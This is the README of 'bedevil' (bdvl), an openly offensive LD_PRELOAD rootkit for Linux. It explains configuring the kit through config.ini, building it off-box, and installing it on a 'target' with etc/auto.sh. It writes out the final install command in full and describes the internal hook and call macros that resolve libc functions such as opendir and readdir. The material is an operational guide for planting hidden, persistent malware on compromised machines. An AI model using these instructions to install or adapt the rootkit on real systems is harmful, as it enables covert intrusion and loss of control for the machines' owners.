
# bedevil

 * This README serves as a place for random pieces of potentially important information.
 * This README will not document old, existing, or previous rootkit features.
   * Maintaining this README started becoming a pain.
   * So, instead of being totally outdated & stale, I figured I should repurpose it.
 * Actual important information is easy enough to find/in obvious places.

## dependencies
 * Only real setup dependency is `python-configparser`.
 * Rootkit dependencies can be viewed in and/or installed by `./etc/depinstall.sh`.
 * These same main dependencies are also installed in `./etc/auto.sh`, before the kit is compiled & installed.

## usage notes
 * Any settings you might want to mess with are available in `./config.ini`.
   * This file's contents are evaluated by `setup.py` & the result cleaned up & written as C header files into `./src/include/`.
   * The evaluation result will also be available in `./build/`.

 * There is no need to build on the box which you plan on installing on.
   * Build in a separate environment.
   * On the target, use `./etc/auto.sh` & to install with your new `./build/*.b64`.

 * `etc/auto.sh` extracts your target `.b64` after installing dependencies.
   * Once extracted, the kit (with your configuration) is compiled & installed.
   * The important functionality of this script is made evident on the very first lines, so I will not spend much time on this.
   * Said functionality allows for a variety of different ways you can get your install on the target.

 * Ultimately, after dependency install, setup & compile, installation of bdvl is done as follows.
   * ``LD_PRELOAD=./build/bdvl.so.`uname -m` sh -c './bdvinstall build/bdvl.so.*'``
   * This is basically the final step of `./etc/auto.sh`.

## important kit functions
 * `hook` : Variadic macro defined in bdv.c.
   * This macro uses `_hook` in `./src/hooks/libdl/gsym.c` with handle `RTLD_NEXT`.
   * The name 'hook' is not accurate, as this only resolves specified symbols, but 'hook' is short & easy to type...
   * This macro & function are possible thanks to the great work of `setup.py`.
     * At build, the contents of `./src/hooks/libdl/hooks` is translated into C arrays, for use at runtime by the kit.
     * We are also given identifiers for each symbol in the main resulting array.
     * These identifiers are always something akin to `CSETGID`, `CCHDIR`, `COPENDIR`, `CREADDIR`, so on...
     * Aforementioned identifier(s) represent the position(s) of the target symbol(s) in the 'all' array.
 * `call` : Variadic macro which depends on the success of a prior `hook(...)`.
   * Call the target function pointer, with any parameters if given, by name of a symbol identifier.